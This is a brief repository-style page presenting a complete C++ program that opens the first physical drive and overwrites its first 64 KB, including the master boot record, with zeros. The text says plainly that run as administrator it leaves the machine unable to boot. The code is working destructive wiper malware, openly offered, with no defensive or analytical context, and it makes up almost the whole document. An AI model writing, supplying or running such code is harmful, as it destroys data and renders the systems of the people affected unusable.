
# C++ Overwrite MBR (Master Boot Record)
If the C ++ code is executed as an administrator, the MBR will be overwritten with many zeros and you will no longer be able to enter the system after a restart.

#


`sample.cpp`
```cpp
#include <windows.h>
int main()
{

	HANDLE MasterBootRecord = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    unsigned char* bootcode = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 65536);

    if (MasterBootRecord == INVALID_HANDLE_VALUE)
        ExitProcess(2);

    DWORD w;
    if (!WriteFile(MasterBootRecord, bootcode, 65536, &w, NULL))
        ExitProcess(3);
    CloseHandle(MasterBootRecord);

}
```
